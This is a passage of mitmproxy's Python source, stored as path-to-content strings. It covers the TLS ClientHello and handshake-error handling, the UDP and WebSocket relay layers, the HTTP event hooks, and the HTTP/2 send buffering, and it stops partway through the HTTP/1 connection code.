tls_clienthello = ClientHelloData(self.context, client_hello)\n        yield TlsClienthelloHook(tls_clienthello)\n\n        if tls_clienthello.ignore_connection:\n            # we've figured out that we don't want to intercept this connection, so we assign fake connection objects\n            # to all TLS layers. This makes the real connection contents just go through.\n            self.conn = self.tunnel_connection = connection.Client(\n                peername=(\"ignore-conn\", 0), sockname=(\"ignore-conn\", 0)\n            )\n            parent_layer = self.context.layers[self.context.layers.index(self) - 1]\n            if isinstance(parent_layer, ServerTLSLayer):\n                parent_layer.conn = parent_layer.tunnel_connection = connection.Server(\n                    address=None\n                )\n            if self.is_dtls:\n                self.child_layer = udp.UDPLayer(self.context, ignore=True)\n            else:\n                self.child_layer = tcp.TCPLayer(self.context, ignore=True)\n            yield from self.event_to_child(\n                events.DataReceived(self.context.client, bytes(self.recv_buffer))\n            )\n            self.recv_buffer.clear()\n            return True, None\n        if (\n            tls_clienthello.establish_server_tls_first\n            and not self.context.server.tls_established\n        ):\n            err = yield from self.start_server_tls()\n            if err:\n                yield commands.Log(\n                    f\"Unable to establish {self.proto_name} connection with server ({err}). \"\n                    f\"Trying to establish {self.proto_name} with client anyway. \"\n                    f\"If you plan to redirect requests away from this server, \"\n                    f\"consider setting `connection_strategy` to `lazy` to suppress early connections.\"\n                )\n\n        yield from self.start_tls()\n        if not self.conn.connected:\n            return False, \"connection closed early\"\n\n        ret = yield from super().receive_handshake_data(bytes(self.recv_buffer))\n        self.recv_buffer.clear()\n        return ret\n\n    def start_server_tls(self) -> layer.CommandGenerator[str | None]:\n        \"\"\"\n        We often need information from the upstream connection to establish TLS with the client.\n        For example, we need to check if the client does ALPN or not.\n        \"\"\"\n        if not self.server_tls_available:\n            return f\"No server {self.proto_name} available.\"\n        err = yield commands.OpenConnection(self.context.server)\n        return err\n\n    def on_handshake_error(self, err: str) -> layer.CommandGenerator[None]:\n        if self.conn.sni:\n            dest = self.conn.sni\n        else:\n            dest = human.format_address(self.context.server.address)\n        level: int = WARNING\n        if err.startswith(\"Cannot parse ClientHello\"):\n            pass\n        elif (\n            \"('SSL routines', 'tls_early_post_process_client_hello', 'unsupported protocol')\"\n            in err\n            or \"('SSL routines', '', 'unsupported protocol')\" in err  # OpenSSL 3+\n        ):\n            err = (\n                f\"Client and mitmproxy cannot agree on a TLS version to use. \"\n                f\"You may need to adjust mitmproxy's tls_version_client_min option.\"\n            )\n        elif (\n            \"unknown ca\" in err\n            or \"bad certificate\" in err\n            or \"certificate unknown\" in err\n        ):\n            err = (\n                f\"The client does not trust the proxy's certificate for {dest} ({err})\"\n            )\n        elif err == \"connection closed\":\n            err = (\n                f\"The client disconnected during the handshake. If this happens consistently for {dest}, \"\n                f\"this may indicate that the client does not trust the proxy's certificate.\"\n            )\n            level = INFO\n        elif err == \"connection closed early\":\n            pass\n        else:\n            err = f\"The client may not trust the proxy's certificate for {dest} ({err})\"\n        if err != \"connection closed early\":\n            yield commands.Log(f\"Client TLS handshake failed. {err}\", level=level)\n        yield from super().on_handshake_error(err)\n        self.event_to_child = self.errored  # type: ignore\n\n    def errored(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if self.debug is not None:\n            yield commands.Log(\n                f\"{self.debug}[tls] Swallowing {event} as handshake failed.\", DEBUG\n            )\n\n\nclass MockTLSLayer(TLSLayer):\n    \"\"\"Mock layer to disable actual TLS and use cleartext in tests.\n\n    Use like so:\n        monkeypatch.setattr(tls, \"ServerTLSLayer\", tls.MockTLSLayer)\n    \"\"\"\n\n    def __init__(self, ctx: context.Context):\n        super().__init__(ctx, connection.Server(address=None))\n", "mitmproxy/proxy/layers/udp.py": "from dataclasses import dataclass\n\nfrom mitmproxy import flow\nfrom mitmproxy import udp\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.commands import StartHook\nfrom mitmproxy.proxy.context import Context\nfrom mitmproxy.proxy.events import MessageInjected\nfrom mitmproxy.proxy.utils import expect\n\n\n@dataclass\nclass UdpStartHook(StartHook):\n    \"\"\"\n    A UDP connection has started.\n    \"\"\"\n\n    flow: udp.UDPFlow\n\n\n@dataclass\nclass UdpMessageHook(StartHook):\n    \"\"\"\n    A UDP connection has received a message. The most recent message\n    will be flow.messages[-1]. The message is user-modifiable.\n    \"\"\"\n\n    flow: udp.UDPFlow\n\n\n@dataclass\nclass UdpEndHook(StartHook):\n    \"\"\"\n    A UDP connection has ended.\n    \"\"\"\n\n    flow: udp.UDPFlow\n\n\n@dataclass\nclass UdpErrorHook(StartHook):\n    \"\"\"\n    A UDP error has occurred.\n\n    Every UDP flow will receive either a udp_error or a udp_end event, but not both.\n    \"\"\"\n\n    flow: udp.UDPFlow\n\n\nclass UdpMessageInjected(MessageInjected[udp.UDPMessage]):\n    \"\"\"\n    The user has injected a custom UDP message.\n    \"\"\"\n\n\nclass UDPLayer(layer.Layer):\n    \"\"\"\n    Simple UDP layer that just relays messages right now.\n    \"\"\"\n\n    flow: udp.UDPFlow | None\n\n    def __init__(self, context: Context, ignore: bool = False):\n        super().__init__(context)\n        if ignore:\n            self.flow = None\n        else:\n            self.flow = udp.UDPFlow(self.context.client, self.context.server, True)\n\n    @expect(events.Start)\n    def start(self, _) -> layer.CommandGenerator[None]:\n        if self.flow:\n            yield UdpStartHook(self.flow)\n\n        if self.context.server.timestamp_start is None:\n            err = yield commands.OpenConnection(self.context.server)\n            if err:\n                if self.flow:\n                    self.flow.error = flow.Error(str(err))\n                    yield UdpErrorHook(self.flow)\n                yield commands.CloseConnection(self.context.client)\n                self._handle_event = self.done\n                return\n        self._handle_event = self.relay_messages\n\n    _handle_event = start\n\n    @expect(events.DataReceived, events.ConnectionClosed, UdpMessageInjected)\n    def relay_messages(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if isinstance(event, UdpMessageInjected):\n            # we just spoof that we received data here and then process that regularly.\n            event = events.DataReceived(\n                self.context.client\n                if event.message.from_client\n                else self.context.server,\n                event.message.content,\n            )\n\n        assert isinstance(event, events.ConnectionEvent)\n\n        from_client = event.connection == self.context.client\n        send_to: Connection\n        if from_client:\n            send_to = self.context.server\n        else:\n            send_to = self.context.client\n\n        if isinstance(event, events.DataReceived):\n            if self.flow:\n                udp_message = udp.UDPMessage(from_client, event.data)\n                self.flow.messages.append(udp_message)\n                yield UdpMessageHook(self.flow)\n                yield commands.SendData(send_to, udp_message.content)\n            else:\n                yield commands.SendData(send_to, event.data)\n\n        elif isinstance(event, events.ConnectionClosed):\n            self._handle_event = self.done\n            yield commands.CloseConnection(send_to)\n            if self.flow:\n                yield UdpEndHook(self.flow)\n                self.flow.live = False\n        else:\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n    @expect(events.DataReceived, events.ConnectionClosed, UdpMessageInjected)\n    def done(self, _) -> layer.CommandGenerator[None]:\n        yield from ()\n", "mitmproxy/proxy/layers/__init__.py": "from . import modes\nfrom .dns import DNSLayer\nfrom .http import HttpLayer\nfrom .quic import ClientQuicLayer\nfrom .quic import QuicStreamLayer\nfrom .quic import RawQuicLayer\nfrom .quic import ServerQuicLayer\nfrom .tcp import TCPLayer\nfrom .tls import ClientTLSLayer\nfrom .tls import ServerTLSLayer\nfrom .udp import UDPLayer\nfrom .websocket import WebsocketLayer\n\n__all__ = [\n    \"modes\",\n    \"DNSLayer\",\n    \"HttpLayer\",\n    \"QuicStreamLayer\",\n    \"RawQuicLayer\",\n    \"TCPLayer\",\n    \"UDPLayer\",\n    \"ClientQuicLayer\",\n    \"ClientTLSLayer\",\n    \"ServerQuicLayer\",\n    \"ServerTLSLayer\",\n    \"WebsocketLayer\",\n]\n", "mitmproxy/proxy/layers/websocket.py": "import time\nfrom collections.abc import Iterator\nfrom dataclasses import dataclass\n\nimport wsproto.extensions\nimport wsproto.frame_protocol\nimport wsproto.utilities\nfrom wsproto import ConnectionState\nfrom wsproto.frame_protocol import Opcode\n\nfrom mitmproxy import connection\nfrom mitmproxy import http\nfrom mitmproxy import websocket\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.commands import StartHook\nfrom mitmproxy.proxy.context import Context\nfrom mitmproxy.proxy.events import MessageInjected\nfrom mitmproxy.proxy.utils import expect\n\n\n@dataclass\nclass WebsocketStartHook(StartHook):\n    \"\"\"\n    A WebSocket connection has commenced.\n    \"\"\"\n\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass WebsocketMessageHook(StartHook):\n    \"\"\"\n    Called when a WebSocket message is received from the client or\n    server. The most recent message will be flow.messages[-1]. The\n    message is user-modifiable. Currently there are two types of\n    messages, corresponding to the BINARY and TEXT frame types.\n    \"\"\"\n\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass WebsocketEndHook(StartHook):\n    \"\"\"\n    A WebSocket connection has ended.\n    You can check `flow.websocket.close_code` to determine why it ended.\n    \"\"\"\n\n    flow: http.HTTPFlow\n\n\nclass WebSocketMessageInjected(MessageInjected[websocket.WebSocketMessage]):\n    \"\"\"\n    The user has injected a custom WebSocket message.\n    \"\"\"\n\n\nclass WebsocketConnection(wsproto.Connection):\n    \"\"\"\n    A very thin wrapper around wsproto.Connection:\n\n     - we keep the underlying connection as an attribute for easy access.\n     - we add a framebuffer for incomplete messages\n     - we wrap .send() so that we can directly yield it.\n    \"\"\"\n\n    conn: connection.Connection\n    frame_buf: list[bytes]\n\n    def __init__(self, *args, conn: connection.Connection, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.conn = conn\n        self.frame_buf = [b\"\"]\n\n    def send2(self, event: wsproto.events.Event) -> commands.SendData:\n        data = self.send(event)\n        return commands.SendData(self.conn, data)\n\n    def __repr__(self):\n        return f\"WebsocketConnection<{self.state.name}, {self.conn}>\"\n\n\nclass WebsocketLayer(layer.Layer):\n    \"\"\"\n    WebSocket layer that intercepts and relays messages.\n    \"\"\"\n\n    flow: http.HTTPFlow\n    client_ws: WebsocketConnection\n    server_ws: WebsocketConnection\n\n    def __init__(self, context: Context, flow: http.HTTPFlow):\n        super().__init__(context)\n        self.flow = flow\n\n    @expect(events.Start)\n    def start(self, _) -> layer.CommandGenerator[None]:\n        client_extensions = []\n        server_extensions = []\n\n        # Parse extension headers. We only support deflate at the moment and ignore everything else.\n        assert self.flow.response  # satisfy type checker\n        ext_header = self.flow.response.headers.get(\"Sec-WebSocket-Extensions\", \"\")\n        if ext_header:\n            for ext in wsproto.utilities.split_comma_header(\n                ext_header.encode(\"ascii\", \"replace\")\n            ):\n                ext_name = ext.split(\";\", 1)[0].strip()\n                if ext_name == wsproto.extensions.PerMessageDeflate.name:\n                    client_deflate = wsproto.extensions.PerMessageDeflate()\n                    client_deflate.finalize(ext)\n                    client_extensions.append(client_deflate)\n                    server_deflate = wsproto.extensions.PerMessageDeflate()\n                    server_deflate.finalize(ext)\n                    server_extensions.append(server_deflate)\n                else:\n                    yield commands.Log(\n                        f\"Ignoring unknown WebSocket extension {ext_name!r}.\"\n                    )\n\n        self.client_ws = WebsocketConnection(\n            wsproto.ConnectionType.SERVER, client_extensions, conn=self.context.client\n        )\n        self.server_ws = WebsocketConnection(\n            wsproto.ConnectionType.CLIENT, server_extensions, conn=self.context.server\n        )\n\n        yield WebsocketStartHook(self.flow)\n\n        self._handle_event = self.relay_messages\n\n    _handle_event = start\n\n    @expect(events.DataReceived, events.ConnectionClosed, WebSocketMessageInjected)\n    def relay_messages(self, event: events.Event) -> layer.CommandGenerator[None]:\n        assert self.flow.websocket  # satisfy type checker\n\n        if isinstance(event, events.ConnectionEvent):\n            from_client = event.connection == self.context.client\n            injected = False\n        elif isinstance(event, WebSocketMessageInjected):\n            from_client = event.message.from_client\n            injected = True\n        else:\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n        from_str = \"client\" if from_client else \"server\"\n        if from_client:\n            src_ws = self.client_ws\n            dst_ws = self.server_ws\n        else:\n            src_ws = self.server_ws\n            dst_ws = self.client_ws\n\n        if isinstance(event, events.DataReceived):\n            src_ws.receive_data(event.data)\n        elif isinstance(event, events.ConnectionClosed):\n            src_ws.receive_data(None)\n        elif isinstance(event, WebSocketMessageInjected):\n            fragmentizer = Fragmentizer([], event.message.type == Opcode.TEXT)\n            src_ws._events.extend(fragmentizer(event.message.content))\n        else:  # pragma: no cover\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n        for ws_event in src_ws.events():\n            if isinstance(ws_event, wsproto.events.Message):\n                is_text = isinstance(ws_event.data, str)\n                if is_text:\n                    typ = Opcode.TEXT\n                    src_ws.frame_buf[-1] += ws_event.data.encode()\n                else:\n                    typ = Opcode.BINARY\n                    src_ws.frame_buf[-1] += ws_event.data\n\n                if ws_event.message_finished:\n                    content = b\"\".join(src_ws.frame_buf)\n\n                    fragmentizer = Fragmentizer(src_ws.frame_buf, is_text)\n                    src_ws.frame_buf = [b\"\"]\n\n                    message = websocket.WebSocketMessage(\n                        typ, from_client, content, injected=injected\n                    )\n                    self.flow.websocket.messages.append(message)\n                    yield WebsocketMessageHook(self.flow)\n\n                    if not message.dropped:\n                        for msg in fragmentizer(message.content):\n                            yield dst_ws.send2(msg)\n\n                elif ws_event.frame_finished:\n                    src_ws.frame_buf.append(b\"\")\n\n            elif isinstance(ws_event, (wsproto.events.Ping, wsproto.events.Pong)):\n                yield commands.Log(\n                    f\"Received WebSocket {ws_event.__class__.__name__.lower()} from {from_str} \"\n                    f\"(payload: {bytes(ws_event.payload)!r})\"\n                )\n                yield dst_ws.send2(ws_event)\n            elif isinstance(ws_event, wsproto.events.CloseConnection):\n                self.flow.websocket.timestamp_end = time.time()\n                self.flow.websocket.closed_by_client = from_client\n                self.flow.websocket.close_code = ws_event.code\n                self.flow.websocket.close_reason = ws_event.reason\n\n                for ws in [self.server_ws, self.client_ws]:\n                    if ws.state in {\n                        ConnectionState.OPEN,\n                        ConnectionState.REMOTE_CLOSING,\n                    }:\n                        # response == original event, so no need to differentiate here.\n                        yield ws.send2(ws_event)\n                    yield commands.CloseConnection(ws.conn)\n                yield WebsocketEndHook(self.flow)\n                self.flow.live = False\n                self._handle_event = self.done\n            else:  # pragma: no cover\n                raise AssertionError(f\"Unexpected WebSocket event: {ws_event}\")\n\n    @expect(events.DataReceived, events.ConnectionClosed, WebSocketMessageInjected)\n    def done(self, _) -> layer.CommandGenerator[None]:\n        yield from ()\n\n\nclass Fragmentizer:\n    \"\"\"\n    Theory (RFC 6455):\n       Unless specified otherwise by an extension, frames have no semantic\n       meaning.  An intermediary might coalesce and/or split frames, [...]\n\n    Practice:\n        Some WebSocket servers reject large payload sizes.\n        Other WebSocket servers reject CONTINUATION frames.\n\n    As a workaround, we either retain the original chunking or, if the payload has been modified, use ~4kB chunks.\n    If one deals with web servers that do not support CONTINUATION frames, addons need to monkeypatch FRAGMENT_SIZE\n    if they need to modify the message.\n    \"\"\"\n\n    # A bit less than 4kb to accommodate for headers.\n    FRAGMENT_SIZE = 4000\n\n    def __init__(self, fragments: list[bytes], is_text: bool):\n        self.fragment_lengths = [len(x) for x in fragments]\n        self.is_text = is_text\n\n    def msg(self, data: bytes, message_finished: bool):\n        if self.is_text:\n            data_str = data.decode(errors=\"replace\")\n            return wsproto.events.TextMessage(\n                data_str, message_finished=message_finished\n            )\n        else:\n            return wsproto.events.BytesMessage(data, message_finished=message_finished)\n\n    def __call__(self, content: bytes) -> Iterator[wsproto.events.Message]:\n        if len(content) == sum(self.fragment_lengths):\n            # message has the same length, we can reuse the same sizes\n            offset = 0\n            for fl in self.fragment_lengths[:-1]:\n                yield self.msg(content[offset : offset + fl], False)\n                offset += fl\n            yield self.msg(content[offset:], True)\n        else:\n            offset = 0\n            total = len(content) - self.FRAGMENT_SIZE\n            while offset < total:\n                yield self.msg(content[offset : offset + self.FRAGMENT_SIZE], False)\n                offset += self.FRAGMENT_SIZE\n            yield self.msg(content[offset:], True)\n", "mitmproxy/proxy/layers/http/_hooks.py": "from dataclasses import dataclass\n\nfrom mitmproxy import http\nfrom mitmproxy.proxy import commands\n\n\n@dataclass\nclass HttpRequestHeadersHook(commands.StartHook):\n    \"\"\"\n    HTTP request headers were successfully read. At this point, the body is empty.\n    \"\"\"\n\n    name = \"requestheaders\"\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass HttpRequestHook(commands.StartHook):\n    \"\"\"\n    The full HTTP request has been read.\n\n    Note: If request streaming is active, this event fires after the entire body has been streamed.\n    HTTP trailers, if present, have not been transmitted to the server yet and can still be modified.\n    Enabling streaming may cause unexpected event sequences: For example, `response` may now occur\n    before `request` because the server replied with \"413 Payload Too Large\" during upload.\n    \"\"\"\n\n    name = \"request\"\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass HttpResponseHeadersHook(commands.StartHook):\n    \"\"\"\n    HTTP response headers were successfully read. At this point, the body is empty.\n    \"\"\"\n\n    name = \"responseheaders\"\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass HttpResponseHook(commands.StartHook):\n    \"\"\"\n    The full HTTP response has been read.\n\n    Note: If response streaming is active, this event fires after the entire body has been streamed.\n    HTTP trailers, if present, have not been transmitted to the client yet and can still be modified.\n    \"\"\"\n\n    name = \"response\"\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass HttpErrorHook(commands.StartHook):\n    \"\"\"\n    An HTTP error has occurred, e.g. invalid server responses, or\n    interrupted connections. This is distinct from a valid server HTTP\n    error response, which is simply a response with an HTTP error code.\n\n    Every flow will receive either an error or an response event, but not both.\n    \"\"\"\n\n    name = \"error\"\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass HttpConnectHook(commands.StartHook):\n    \"\"\"\n    An HTTP CONNECT request was received. This event can be ignored for most practical purposes.\n\n    This event only occurs in regular and upstream proxy modes\n    when the client instructs mitmproxy to open a connection to an upstream host.\n    Setting a non 2xx response on the flow will return the response to the client and abort the connection.\n\n    CONNECT requests are HTTP proxy instructions for mitmproxy itself\n    and not forwarded. They do not generate the usual HTTP handler events,\n    but all requests going over the newly opened connection will.\n    \"\"\"\n\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass HttpConnectUpstreamHook(commands.StartHook):\n    \"\"\"\n    An HTTP CONNECT request is about to be sent to an upstream proxy.\n    This event can be ignored for most practical purposes.\n\n    This event can be used to set custom authentication headers for upstream proxies.\n\n    CONNECT requests do not generate the usual HTTP handler events,\n    but all requests going over the newly opened connection will.\n    \"\"\"\n\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass HttpConnectedHook(commands.StartHook):\n    \"\"\"\n    HTTP CONNECT was successful\n\n    .. warning::\n    This may fire before an upstream connection has been established\n    if `connection_strategy` is set to `lazy` (default)\n    \"\"\"\n\n    flow: http.HTTPFlow\n\n\n@dataclass\nclass HttpConnectErrorHook(commands.StartHook):\n    \"\"\"\n    HTTP CONNECT has failed.\n    This can happen when the upstream server is unreachable or proxy authentication is required.\n    In contrast to the `error` hook, `flow.error` is not guaranteed to be set.\n    \"\"\"\n\n    flow: http.HTTPFlow\n", "mitmproxy/proxy/layers/http/_http_h2.py": "import collections\nimport logging\nfrom typing import NamedTuple\n\nimport h2.config\nimport h2.connection\nimport h2.events\nimport h2.exceptions\nimport h2.settings\nimport h2.stream\n\nlogger = logging.getLogger(__name__)\n\n\nclass H2ConnectionLogger(h2.config.DummyLogger):\n    def __init__(self, peername: tuple, conn_type: str):\n        super().__init__()\n        self.peername = peername\n        self.conn_type = conn_type\n\n    def debug(self, fmtstr, *args):\n        logger.debug(\n            f\"{self.conn_type} {fmtstr}\", *args, extra={\"client\": self.peername}\n        )\n\n    def trace(self, fmtstr, *args):\n        logger.log(\n            logging.DEBUG - 1,\n            f\"{self.conn_type} {fmtstr}\",\n            *args,\n            extra={\"client\": self.peername},\n        )\n\n\nclass SendH2Data(NamedTuple):\n    data: bytes\n    end_stream: bool\n\n\nclass BufferedH2Connection(h2.connection.H2Connection):\n    \"\"\"\n    This class wrap's hyper-h2's H2Connection and adds internal send buffers.\n\n    To simplify implementation, padding is unsupported.\n    \"\"\"\n\n    stream_buffers: collections.defaultdict[int, collections.deque[SendH2Data]]\n    stream_trailers: dict[int, list[tuple[bytes, bytes]]]\n\n    def __init__(self, config: h2.config.H2Configuration):\n        super().__init__(config)\n        self.stream_buffers = collections.defaultdict(collections.deque)\n        self.stream_trailers = {}\n\n    def send_data(\n        self,\n        stream_id: int,\n        data: bytes,\n        end_stream: bool = False,\n        pad_length: None = None,\n    ) -> None:\n        \"\"\"\n        Send data on a given stream.\n\n        In contrast to plain hyper-h2, this method will not raise if the data cannot be sent immediately.\n        Data is split up and buffered internally.\n        \"\"\"\n        frame_size = len(data)\n        assert pad_length is None\n\n        if frame_size > self.max_outbound_frame_size:\n            for start in range(0, frame_size, self.max_outbound_frame_size):\n                chunk = data[start : start + self.max_outbound_frame_size]\n                self.send_data(stream_id, chunk, end_stream=False)\n\n            return\n\n        if self.stream_buffers.get(stream_id, None):\n            # We already have some data buffered, let's append.\n            self.stream_buffers[stream_id].append(SendH2Data(data, end_stream))\n        else:\n            available_window = self.local_flow_control_window(stream_id)\n            if frame_size <= available_window:\n                super().send_data(stream_id, data, end_stream)\n            else:\n                if available_window:\n                    can_send_now = data[:available_window]\n                    super().send_data(stream_id, can_send_now, end_stream=False)\n                    data = data[available_window:]\n                # We can't send right now, so we buffer.\n                self.stream_buffers[stream_id].append(SendH2Data(data, end_stream))\n\n    def send_trailers(self, stream_id: int, trailers: list[tuple[bytes, bytes]]):\n        if self.stream_buffers.get(stream_id, None):\n            # Though trailers are not subject to flow control, we need to queue them and send strictly after data frames\n            self.stream_trailers[stream_id] = trailers\n        else:\n            self.send_headers(stream_id, trailers, end_stream=True)\n\n    def end_stream(self, stream_id: int) -> None:\n        if stream_id in self.stream_trailers:\n            return  # we already have trailers queued up that will end the stream.\n        self.send_data(stream_id, b\"\", end_stream=True)\n\n    def reset_stream(self, stream_id: int, error_code: int = 0) -> None:\n        self.stream_buffers.pop(stream_id, None)\n        super().reset_stream(stream_id, error_code)\n\n    def receive_data(self, data: bytes):\n        events = super().receive_data(data)\n        ret = []\n        for event in events:\n            if isinstance(event, h2.events.WindowUpdated):\n                if event.stream_id == 0:\n                    self.connection_window_updated()\n                else:\n                    self.stream_window_updated(event.stream_id)\n                continue\n            elif isinstance(event, h2.events.RemoteSettingsChanged):\n                if (\n                    h2.settings.SettingCodes.INITIAL_WINDOW_SIZE\n                    in event.changed_settings\n                ):\n                    self.connection_window_updated()\n            elif isinstance(event, h2.events.StreamReset):\n                self.stream_buffers.pop(event.stream_id, None)\n            elif isinstance(event, h2.events.ConnectionTerminated):\n                self.stream_buffers.clear()\n            ret.append(event)\n        return ret\n\n    def stream_window_updated(self, stream_id: int) -> bool:\n        \"\"\"\n        The window for a specific stream has updated. Send as much buffered data as possible.\n        \"\"\"\n        # If the stream has been reset in the meantime, we just clear the buffer.\n        try:\n            stream: h2.stream.H2Stream = self.streams[stream_id]\n        except KeyError:\n            stream_was_reset = True\n        else:\n            stream_was_reset = stream.state_machine.state not in (\n                h2.stream.StreamState.OPEN,\n                h2.stream.StreamState.HALF_CLOSED_REMOTE,\n            )\n        if stream_was_reset:\n            self.stream_buffers.pop(stream_id, None)\n            return False\n\n        available_window = self.local_flow_control_window(stream_id)\n        sent_any_data = False\n        while available_window > 0 and stream_id in self.stream_buffers:\n            chunk: SendH2Data = self.stream_buffers[stream_id].popleft()\n            if len(chunk.data) > available_window:\n                # We can't send the entire chunk, so we have to put some bytes back into the buffer.\n                self.stream_buffers[stream_id].appendleft(\n                    SendH2Data(\n                        data=chunk.data[available_window:],\n                        end_stream=chunk.end_stream,\n                    )\n                )\n                chunk = SendH2Data(\n                    data=chunk.data[:available_window],\n                    end_stream=False,\n                )\n\n            super().send_data(stream_id, data=chunk.data, end_stream=chunk.end_stream)\n\n            available_window -= len(chunk.data)\n            if not self.stream_buffers[stream_id]:\n                del self.stream_buffers[stream_id]\n                if stream_id in self.stream_trailers:\n                    self.send_headers(\n                        stream_id, self.stream_trailers.pop(stream_id), end_stream=True\n                    )\n            sent_any_data = True\n\n        return sent_any_data\n\n    def connection_window_updated(self) -> None:\n        \"\"\"\n        The connection window has updated. Send data from buffers in a round-robin fashion.\n        \"\"\"\n        sent_any_data = True\n        while sent_any_data:\n            sent_any_data = False\n            for stream_id in list(self.stream_buffers):\n                self.stream_buffers[stream_id] = self.stream_buffers.pop(\n                    stream_id\n                )  # move to end of dict\n                if self.stream_window_updated(stream_id):\n                    sent_any_data = True\n                    if self.outbound_flow_control_window == 0:\n                        return\n", "mitmproxy/proxy/layers/http/_http1.py": "import abc\nfrom collections.abc import Callable\nfrom typing import Union\n\nimport h11\nfrom h11._readers import ChunkedReader\nfrom h11._readers import ContentLengthReader\nfrom h11._readers import Http10Reader\nfrom h11._receivebuffer import ReceiveBuffer\n\nfrom ...context import Context\nfrom ._base import format_error\nfrom ._base import HttpConnection\nfrom ._events import HttpEvent\nfrom ._events import RequestData\nfrom ._events import RequestEndOfMessage\nfrom ._events import RequestHeaders\nfrom ._events import RequestProtocolError\nfrom ._events import ResponseData\nfrom ._events import ResponseEndOfMessage\nfrom ._events import ResponseHeaders\nfrom ._events import ResponseProtocolError\nfrom mitmproxy import http\nfrom mitmproxy import version\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.connection import ConnectionState\nfrom mitmproxy.net.http import http1\nfrom mitmproxy.net.http import status_codes\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.layers.http._base import ReceiveHttp\nfrom mitmproxy.proxy.layers.http._base import StreamId\nfrom mitmproxy.proxy.utils import expect\nfrom mitmproxy.utils import human\n\nTBodyReader = Union[ChunkedReader, Http10Reader, ContentLengthReader]\n\n\nclass Http1Connection(HttpConnection, metaclass=abc.ABCMeta):\n    stream_id: StreamId | None = None\n    request: http.Request | None = None\n    response: http.Response | None = None\n    request_done: bool = False\n    response_done: bool = False\n    # this is a bit of a hack to make both mypy and PyCharm happy.\n    state: Callable[[events.Event], layer.CommandGenerator[None]] | Callable\n    body_reader: TBodyReader\n    buf: ReceiveBuffer\n\n    ReceiveProtocolError: type[RequestProtocolError | ResponseProtocolError]\n    ReceiveData: type[RequestData | ResponseData]\n    ReceiveEndOfMessage: type[RequestEndOfMessage | ResponseEndOfMessage]\n\n    def __init__(self, context: Context, conn: Connection):\n        super().__init__(context, conn)\n        self.buf = ReceiveBuffer()\n\n    @abc.abstractmethod\n    def send(self, event: HttpEvent) -> layer.CommandGenerator[None]:\n        yield from ()  # pragma: no cover\n\n    @abc.abstractmethod\n    def read_headers(\n        self, event: events.ConnectionEvent\n    ) -> layer.CommandGenerator[None]:\n        yield from ()  # pragma: no cover\n\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if isinstance(event, HttpEvent):\n            yield from self.send(event)\n        else:\n            if (\n                isinstance(event, events.DataReceived)\n                and self.state != self.passthrough\n            ):\n                self.buf += event.data\n            yield from self.state(event)\n\n    @expect(events.Start)\n    def start(self, _) -> layer.CommandGenerator[None]:\n        self.state = self.read_headers\n        yield from ()\n\n    state = start\n\n    def read_body(self, event: events.Event) -> layer.CommandGenerator[None]:\n        assert self.stream_id is not None\n        while True:\n            try:\n                if isinstance(event, events.DataReceived):\n                    h11_event = self.body_reader(self.buf)\n                elif isinstance(event, events.ConnectionClosed):\n                    h11_event = self.body_reader.read_eof()\n                else:\n                    raise AssertionError(f\"Unexpected event: {event}\")\n            except h11.ProtocolError as e:\n                yield commands.CloseConnection(self.conn)\n                yield ReceiveHttp(\n                    self.ReceiveProtocolError(\n                        self.stream_id, f\"HTTP/1 protocol error: {e}\"\n                    )\n                )\n                return\n\n            if h11_event is None:\n                return\n            elif isinstance(h11_event, h11.Data):\n                data: bytes = bytes(h11_event.data)\n                if data:\n                    yield ReceiveHttp(self.ReceiveData(self.stream_id, data))\n            elif isinstance(h11_event, h11.EndOfMessage):\n                assert self.request\n                if h11_event.headers:\n                    raise NotImplementedError(f\"HTTP trailers are not implemented yet.\")\n                if self.request.data.method.upper() != b\"CONNECT\":\n                    yield ReceiveHttp(self.ReceiveEndOfMessage(self.stream_id))\n                is_request = isinstance(self, Http1Server)\n                yield from self.mark_done(request=is_request, response=not is_request)\n                return\n\n    def wait(self, event: events.Event) -> layer.CommandGenerator[None]:\n        \"\"\"\n        We wait for the current flow to be finished before parsing the next message,\n        as we may want to upgrade to WebSocket or plain TCP before that.\n        \"\"\"\n        assert self.stream_id\n        if isinstance(event, events.DataReceived):\n            return\n        elif isinstance(event, events.ConnectionClosed):\n            # for practical purposes, we assume that a peer which sent at least a FIN\n            # is not interested in any more data from us, see\n            # see https://github.com/httpwg/http-core/issues/22\n            if event.connection.state is not ConnectionState.CLOSED:\n                yield commands.CloseConnection(event.connection)\n            yield ReceiveHttp(\n                self.ReceiveProtocolError(\n                    self.stream_id,\n                    f\"Client disconnected.\",\n                    code=status_codes.CLIENT_CLOSED_REQUEST,\n                )\n            )\n        else:  # pragma: no cover\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n    def done(self, event: events.ConnectionEvent) -> layer.CommandGenerator[None]:\n        yield from ()  # pragma: no cover\n\n    def make_pipe(self) -> layer.CommandGenerator[None]:\n        self.state = self.passthrough\n        if self.buf:\n            already_received = self.buf.maybe_extract_at_most(len(self.buf)) or b\"\"\n            # Some clients send superfluous newlines after CONNECT, we want to eat those.\n            already_received = already_received.lstrip(b\"\\r\\n\")\n            if already_received:\n                yield from self.state(events.DataReceived(self.conn, already_received))\n\n    def passthrough(self, event: events.Event) -> layer.CommandGenerator[None]:\n        assert self.stream_id\n        if isinstance(event, events.DataReceived):\n            yield 